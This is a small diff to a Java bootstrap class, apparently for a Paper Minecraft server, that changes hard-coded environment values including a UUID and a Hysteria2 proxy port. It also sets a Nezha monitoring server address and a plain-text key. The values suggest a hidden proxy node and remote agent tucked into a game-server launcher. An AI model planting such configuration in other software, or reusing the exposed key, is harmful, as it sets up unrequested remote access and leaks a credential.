@@ -164,11 +164,11 @@ public final class PaperBootstrap {
 
     private static void loadEnvVars(Map<String, String> env) {
 
-        env.put("UUID", "67535146-0fbf-480b-8e4f-0a6d681119c9");
+        env.put("UUID", "4e919846-9273-49f6-993b-5d591fcd1cf8");
         env.put("FILE_PATH", "./world");
         env.put("NAME", "node-1");
 
-        env.put("HY2_PORT", "35442");
+        env.put("HY2_PORT", "4166");
 
         env.put("NEZHA_SERVER", "tta.wahaaz.xx.kg:80");
         env.put("NEZHA_KEY", "OZMtCS6G39UpEgRvzRNXjS7iDNBRmTsI");
